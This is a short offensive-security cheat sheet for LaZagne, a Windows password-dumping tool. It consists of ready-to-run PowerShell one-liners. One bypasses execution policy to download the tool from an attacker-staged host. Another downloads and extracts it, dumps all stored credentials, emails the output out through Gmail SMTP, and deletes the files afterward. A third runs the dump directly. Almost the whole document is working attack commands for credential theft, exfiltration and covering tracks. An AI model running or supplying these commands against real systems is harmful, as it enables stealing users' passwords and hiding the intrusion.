# Lazagne

% lazagne, dump password
#plateform/windows  #target/local  #cat/CREDENTIAL-ACCESS/CREDS_RECOVER 

## download on disk

```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<local_ip>:<port|80>/windows/windows_weaponize/bin/LaZagne.exe','<windows_writable_path>/LaZagne.exe')"
```

## file transfert - download csharp into memory (Assembly reflection)
```powershell
powershell -ExecutionPolicy Bypass -noLogo -Command (new-object System.Net.WebClient).DownloadFile('https://github.com/AlessandroZ/LaZagne/releases/download/2.3.2/Windows.zip','1.zip');$shell = new-object -com shell.application; $shell.namespace($pwd.path).copyhere($shell.namespace((join-path $pwd '1.zip')).items())
;$body = [string](.\Windows\laZagne.exe all);$email = 'EMAIL@gmail.com'; $Password = 'PASSWORDHERE'; $SMTPServer = 'smtp.gmail.com'; $SMTPPort = '587'; $subject = 'Passwords'; $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $Password); $smtp.Send($email, $email, $subject, $body);rm .\1.zip, .\Windows\ -Force -Recurse
```

## dump all passwords (trigger av)
```
lazagne.exe all
```
